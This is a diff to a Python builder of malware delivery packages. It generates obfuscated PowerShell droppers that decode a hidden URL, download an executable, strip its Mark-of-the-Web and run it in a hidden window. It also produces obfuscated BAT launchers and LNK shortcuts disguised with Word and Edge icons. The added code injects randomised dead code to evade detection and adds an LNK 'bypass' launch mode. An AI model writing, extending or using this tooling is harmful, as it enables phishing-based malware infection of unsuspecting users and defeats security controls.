@@ -65,6 +65,8 @@ TARGET_FILENAME  = os.environ.get('TARGET_FILENAME', 'cat.exe')
 VARIANTS_DIR     = os.environ.get('VARIANTS_DIR', './variants')
 OUTPUT_DIR       = os.environ.get('OUTPUT_DIR', './output')
 DELIVERY_METHOD  = os.environ.get('DELIVERY_METHOD', 'webclient')  # webclient | base64_recycle
+LNK_BYPASS       = os.environ.get('LNK_BYPASS', '')               # non-empty = direct BAT exec (no start /min)
+JUNK_CODE        = os.environ.get('JUNK_CODE', '')                # non-empty = inject dead-code functions/vars
 
 # ====================================================================
 #  CONSTANTS
@@ -240,16 +242,25 @@ def generate_ps1(encrypt_map, decrypt_map):
         map_lines.append('    ' + '; '.join(chunk) + '; ')
     map_block = '\n'.join(map_lines)
 
+    # ── junk code blocks ──
+    junk_funcs_block = ''
+    junk_vars_block = ''
+    if JUNK_CODE:
+        junk_funcs_block = '\n'.join(_junk_ps1_functions()) + '\n\n'
+        junk_vars_block = '\n'.join(_junk_ps1_vars()) + '\n'
+
     # ── assemble final artifact ──
     artifact = (
         f"${var_url} = '{b64_url}'\n"
         f"${var_filename} = '{b64_filename}'\n"
         f"${var_enc_body} = '{encrypted_body}'\n"
         f"\n"
+        f"{junk_vars_block}"
         f"${var_dec_map} = @{{\n"
         f"{map_block}\n"
         f"}}\n"
         f"\n"
+        f"{junk_funcs_block}"
         f"function {var_func} {{\n"
         f"    param ([string]$InputString)\n"
         f"    $result = \"\"\n"
@@ -347,16 +358,25 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         map_lines.append('    ' + '; '.join(chunk) + '; ')
     map_block = '\n'.join(map_lines)
 
+    # ── junk code blocks ──
+    junk_funcs_block = ''
+    junk_vars_block = ''
+    if JUNK_CODE:
+        junk_funcs_block = '\n'.join(_junk_ps1_functions()) + '\n\n'
+        junk_vars_block = '\n'.join(_junk_ps1_vars()) + '\n'
+
     # ── assemble final artifact ──
     artifact = (
         f"${var_url} = '{b64_url}'\n"
         f"${var_filename} = '{b64_filename}'\n"
         f"${var_enc_body} = '{encrypted_body}'\n"
         f"\n"
+        f"{junk_vars_block}"
         f"${var_dec_map} = @{{\n"
         f"{map_block}\n"
         f"}}\n"
         f"\n"
+        f"{junk_funcs_block}"
         f"function {var_func} {{\n"
         f"    param ([string]$InputString)\n"
         f"    $result = \"\"\n"
@@ -387,7 +407,11 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         f"if (Test-Path ${var_exec_path}) {{\n"
         f"    Remove-Item -Path ${var_exec_path} -Stream Zone.Identifier -ErrorAction SilentlyContinue\n"
         f"    Unblock-File -Path ${var_exec_path} -ErrorAction SilentlyContinue\n"
-        f"    Start-Process -FilePath ${var_exec_path} -WindowStyle Hidden\n"
+        f"    $psi = New-Object System.Diagnostics.ProcessStartInfo\n"
+        f"    $psi.FileName = ${var_exec_path}\n"
+        f"    $psi.UseShellExecute = $false\n"
+        f"    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden\n"
+        f"    [System.Diagnostics.Process]::Start($psi) | Out-Null\n"
         f"}}\n"
     )
     return artifact
@@ -432,6 +456,135 @@ def _junk_rems():
     return pool[:random.randint(3, 5)]
 
 
+# ====================================================================
+#  JUNK CODE GENERATORS (BAT + PS1)
+# ====================================================================
+
+_BAT_JUNK_LABELS = [
+    'chkDisk', 'initNet', 'loadCfg', 'syncMod', 'verSig',
+    'hrtBeat', 'updSvc', 'diagRun', 'logRotate', 'cleanTmp',
+    'parseCfg', 'enumDev', 'regCheck', 'dnsFlush', 'arpScan',
+]
+
+_PS1_JUNK_VERBS = [
+    'Get', 'Set', 'Test', 'Invoke', 'Initialize', 'Resolve',
+    'Validate', 'Convert', 'Compare', 'Measure', 'Sync', 'Update',
+]
+
+_PS1_JUNK_NOUNS = [
+    'ConfigState', 'ModuleHash', 'RegistryPath', 'CertStore',
+    'ServiceFlag', 'BufferSize', 'TokenValue', 'IndexEntry',
+    'PolicyNode', 'CacheBlock', 'SessionKey', 'DriverInfo',
+]
+
+
+def _junk_bat_blocks():
+    """Generate dead-code BAT blocks: SET vars, IF-GOTO, labels."""
+    blocks = []
+    used_labels = set()
+
+    # dead SET variables (3-6)
+    for _ in range(random.randint(3, 6)):
+        vn = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
+        val = random.choice([
+            str(random.randint(0, 65535)),
+            ''.join(random.choices(string.hexdigits[:16], k=random.randint(6, 12))),
+            random.choice(FILLER_WORDS) + str(random.randint(10, 99)),
+        ])
+        blocks.append(f'set "{vn}={val}"')
+
+    # dead IF-GOTO (1-2) — condition always false
+    for _ in range(random.randint(1, 2)):
+        lbl = random.choice(_BAT_JUNK_LABELS)
+        while lbl in used_labels:
+            lbl = random.choice(_BAT_JUNK_LABELS)
+        used_labels.add(lbl)
+        false_var = ''.join(random.choices(string.ascii_uppercase, k=3))
+        blocks.append(f'if defined {false_var} goto {lbl}')
+
+    # dead labels with REM body (1-2)
+    for _ in range(random.randint(1, 2)):
+        lbl = random.choice(_BAT_JUNK_LABELS)
+        while lbl in used_labels:
+            lbl = random.choice(_BAT_JUNK_LABELS)
+        used_labels.add(lbl)
+        blocks.append(f'goto :skip_{lbl}')
+        blocks.append(f':{lbl}')
+        blocks.append(f'REM {random.choice(FILLER_WORDS)} {random.choice(FILLER_WORDS)} {random.randint(1,999)}')
+        blocks.append(f':skip_{lbl}')
+
+    random.shuffle(blocks)
+    return blocks
+
+
+def _junk_ps1_functions():
+    """Generate dead PS1 functions that do nothing useful."""
+    funcs = []
+    count = random.randint(2, 4)
+    used = set()
+
+    for _ in range(count):
+        verb = random.choice(_PS1_JUNK_VERBS)
+        noun = random.choice(_PS1_JUNK_NOUNS)
+        name = f'{verb}-{noun}'
+        while name in used:
+            verb = random.choice(_PS1_JUNK_VERBS)
+            noun = random.choice(_PS1_JUNK_NOUNS)
+            name = f'{verb}-{noun}'
+        used.add(name)
+
+        v1 = random_var_name()
+        v2 = random_var_name()
+        val1 = random.randint(0, 65535)
+        val2 = random.randint(100, 9999)
+
+        body = random.choice([
+            # pattern A: compute and return
+            (
+                f"function {name} {{\n"
+                f"    param([int]$x = {val1})\n"
+                f"    ${v1} = $x -bxor {val2}\n"
+                f"    return ${v1}\n"
+                f"}}\n"
+            ),
+            # pattern B: hashtable lookup
+            (
+                f"function {name} {{\n"
+                f"    ${v1} = @{{'{random_var_name()}'={val1}; '{random_var_name()}'={val2}}}\n"
+                f"    ${v2} = ${v1}.Keys | Sort-Object\n"
+                f"    return ${v2}.Count\n"
+                f"}}\n"
+            ),
+            # pattern C: string manipulation
+            (
+                f"function {name} {{\n"
+                f"    param([string]$s = '{random_var_name()}')\n"
+                f"    ${v1} = $s.Length -band 0xFF\n"
+                f"    ${v2} = [char[]]$s | ForEach-Object {{ [int]$_ }}\n"
+                f"    return ${v1}\n"
+                f"}}\n"
+            ),
+        ])
+        funcs.append(body)
+
+    return funcs
+
+
+def _junk_ps1_vars():
+    """Generate dead PS1 variable assignments."""
+    lines = []
+    for _ in range(random.randint(3, 6)):
+        vn = random_var_name()
+        val = random.choice([
+            f"0x{random.randint(0, 0xFFFF):04x}",
+            f"'{random_var_name()}'",
+            f"[math]::Abs({random.randint(-9999, 9999)})",
+            f"@({', '.join(str(random.randint(0, 255)) for _ in range(random.randint(3, 6)))})",
+        ])
+        lines.append(f"${vn} = {val}")
+    return lines
+
+
 def generate_bat(decoy_name, ps1_name='ser.ps1'):
     """Build obfuscated BAT content."""
     ps_fragments = [('pow', 'a'), ('ersh', 'b'), ('ell', 'c')]
@@ -455,6 +608,11 @@ def generate_bat(decoy_name, ps1_name='ser.ps1'):
     while rem_i < len(rems):
         bat_lines.append(rems[rem_i])
         rem_i += 1
+
+    # ── junk dead-code blocks ──
+    if JUNK_CODE:
+        bat_lines.append('')
+        bat_lines.extend(_junk_bat_blocks())
 
     ps_exe = '%' + '%%'.join(v for _, v in ps_fragments) + '%'
     ps_args = '%' + '%%'.join(v for _, v in arg_fragments) + '%'
@@ -799,14 +957,20 @@ def process_variant(variant_dir, output_dir):
         # Create LNK (Word icon)
         lnk_name = os.path.splitext(first_docx)[0] + '.lnk'
         lnk_path = os.path.join(word_pkg_dir, lnk_name)
+        if LNK_BYPASS:
+            lnk_args = f'/c ".\\{w_bat}"'
+            lnk_ws = 7   # SW_SHOWMINNOACTIVE
+        else:
+            lnk_args = f'/c "start /min .\\{w_bat}"'
+            lnk_ws = 1   # SW_SHOWNORMAL
         create_lnk(
             out_path=lnk_path,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments=f'/c "start /min .\\{w_bat}"',
+            arguments=lnk_args,
             icon_location='%SystemRoot%\\System32\\SHELL32.dll',
             icon_index=1,
             working_dir=None,
-            window_style=1,
+            window_style=lnk_ws,
         )
         print(f'      LNK: {lnk_name} (Word icon)')
 
@@ -886,14 +1050,20 @@ def process_variant(variant_dir, output_dir):
         # Create LNK (Edge icon)
         lnk_name_pdf = os.path.splitext(first_docx)[0] + '.lnk'
         lnk_path_pdf = os.path.join(pdf_pkg_dir, lnk_name_pdf)
+        if LNK_BYPASS:
+            lnk_args_pdf = f'/c ".\\{p_bat}"'
+            lnk_ws_pdf = 7   # SW_SHOWMINNOACTIVE
+        else:
+            lnk_args_pdf = f'/c "start /min .\\{p_bat}"'
+            lnk_ws_pdf = 1   # SW_SHOWNORMAL
         create_lnk(
             out_path=lnk_path_pdf,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments=f'/c "start /min .\\{p_bat}"',
+            arguments=lnk_args_pdf,
             icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
             icon_index=11,
             working_dir=None,
-            window_style=1,
+            window_style=lnk_ws_pdf,
         )
         print(f'      LNK: {lnk_name_pdf} (Edge icon)')
 
@@ -964,6 +1134,8 @@ def main():
     print(f'[*] Lambda URL: {LAMBDA_URL}')
     print(f'[*] Target filename: {TARGET_FILENAME}')
     print(f'[*] Delivery method: {DELIVERY_METHOD}')
+    print(f'[*] LNK bypass:      {"ON" if LNK_BYPASS else "off"}')
+    print(f'[*] Junk code:       {"ON" if JUNK_CODE else "off"}')
 
     for vd in variant_dirs:
         process_variant(vd, output_dir)
